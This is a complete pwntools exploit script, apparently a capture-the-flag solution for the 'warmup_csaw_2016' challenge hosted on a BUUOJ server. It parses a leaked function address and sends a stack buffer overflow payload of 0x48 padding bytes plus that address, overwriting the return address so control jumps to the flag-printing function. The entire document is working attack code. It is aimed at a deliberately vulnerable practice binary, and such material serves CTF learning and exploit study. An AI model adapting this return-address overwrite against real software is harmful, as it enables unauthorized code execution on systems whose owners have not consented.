from pwn import *
context.arch = 'amd64'

p = process('./warmup_csaw_2016')
p = remote('node3.buuoj.cn',26357)

p.recvuntil('WOW:')
func_flag = int(p.recvuntil('\n>')[:-2],16)
log.info('func_flag = %#x',func_flag)

payload = 'a'*(0x40+8) + p64(func_flag)
p.sendline(payload)
print p.recv()

